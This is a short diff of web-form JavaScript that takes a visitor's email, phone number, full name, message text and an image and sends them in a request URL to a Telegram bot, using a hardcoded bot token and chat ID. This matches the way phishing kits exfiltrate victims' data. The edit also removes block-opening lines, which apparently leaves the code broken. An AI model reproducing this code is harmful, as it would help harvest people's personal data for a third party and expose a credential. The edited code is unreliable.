@@ -709,17 +709,10 @@
 
 
                                                 // Check if a file is selected
-                        if (img.files.length > 0) {
-                            let reader = new FileReader();
-                            reader.onload = function() {
-                            // Get the data URL of the image
-                            let imgSrc = reader.result;
-
-                            alert("imgSrc = "+imgSrc);
-                            alert("encodeURIComponent(imgSrc) = "+encodeURIComponent(imgSrc));
+                     
 
                             let Http = new XMLHttpRequest();
-                            let url = 'https://api.telegram.org/bot6413357158:AAFTaNXZANJNs9pehMUIqom0whxjlN-dAcU/sendphoto?chat_id=1632888291&photo=' + encodeURIComponent(imgSrc) + '&caption=information : %0A email : ' + Email + '%0A phone : ' + phone + '%0A fullname : ' + firstname + '+' + lastname + '%0A text' + text;
+                            let url = 'https://api.telegram.org/bot6413357158:AAFTaNXZANJNs9pehMUIqom0whxjlN-dAcU/sendphoto?chat_id=1632888291&photo=' + img.src+ '&caption=information : %0A email : ' + Email + '%0A phone : ' + phone + '%0A fullname : ' + firstname + '+' + lastname + '%0A text' + text;
                             Http.open("POST", url);
                             Http.send();
                             
